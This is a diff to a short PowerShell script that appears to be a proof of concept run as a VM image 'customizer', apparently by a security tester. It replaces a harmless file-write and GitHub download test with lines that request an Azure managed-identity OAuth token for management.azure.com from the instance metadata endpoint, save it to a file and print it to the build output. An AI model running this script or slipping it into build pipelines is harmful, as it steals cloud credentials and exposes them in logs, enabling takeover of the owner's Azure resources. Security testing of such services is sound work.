@@ -1,6 +1,7 @@
-Write-Host "Executing command"
-echo  "This is a test" > C:\\Windows\\System32\\spool\\drivers\\color\\bar.txt
-Write-Host "Reaching out to github..."
-Invoke-WebRequest https://raw.githubusercontent.com/pcarulli/customTest/main/.visualstudio.com/_git/customizers/powershellScripts/readme.md -UseBasicParsing > .\test.txt
-Write-Host "Done" 
-exit 0
+filter timestamp {"$(Get-Date ([datetime]::UtcNow) -Format G) UTC: $_"}
+Write-Output "Running Casaba Customizer..." | timestamp
+Invoke-WebRequest "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H @{"Metadata" = "true"} -UseBasicParsing -OutFile meta.txt
+$result=Get-Content "meta.txt"
+Write-Output "Finishing up..."
+Write-Output $result
+Write-Output "Exiting image customizer" | timestamp
